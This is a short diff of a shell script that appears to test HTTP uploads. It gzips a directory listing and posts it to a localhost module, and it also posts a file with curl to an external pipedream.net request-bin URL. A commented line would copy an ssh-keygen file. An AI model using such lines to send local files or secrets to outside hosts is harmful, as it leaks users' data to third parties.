@@ -10,10 +10,16 @@
 
 #curl "$url"
 
-echo $(ls -la tools) > file2.txt
-#echo $(cat tools/ssh-keygen) > file.txt
+echo $(ls -la tools) > body
 #echo $(cat tools/ssh-keygen) > file.txt
 
+#curl -i -X POST https://en0liva7dzyvpp.x.pipedream.net/ \
+#  -H "Content-Type: text/xml" \
+#  --data-binary "@file2.txt"
+
+gzip body
+curl -v -i http://localhost/mymodule -H'Content-Encoding: gzip' --data-binary @body.gz 
+
 curl -i -X POST https://en0liva7dzyvpp.x.pipedream.net/ \
-  -H "Content-Type: text/xml" \
+  -H "Content-Encoding: gzip" \
   --data-binary "@file2.txt"
